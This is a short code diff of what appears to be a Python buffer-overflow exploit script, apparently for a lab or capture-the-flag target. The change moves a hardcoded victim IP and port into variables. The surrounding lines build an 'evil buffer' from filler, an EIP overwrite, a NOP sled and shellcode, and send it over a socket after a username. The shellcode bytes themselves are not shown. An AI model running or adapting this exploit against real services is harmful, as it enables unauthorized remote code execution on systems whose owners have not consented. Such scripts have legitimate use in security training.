@@ -9,6 +9,10 @@ Be sure to generate new shellcode and change the victim IP if necessary.
 import socket
 import time
 
+# change this
+victim_ip = "10.10.51.94"
+victim_port = 9999
+
 print("\nSending evil buffer...")
 
 username = b"minus" + b"\x0a"
@@ -53,7 +57,7 @@ buffer = filler + eip + nops + shellcode + b"\x0a"
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-s.connect(("10.10.51.94", 9999)) # Change this
+s.connect((victim_ip, victim_port))
 s.send(username)
 time.sleep(2)
 s.send(buffer)
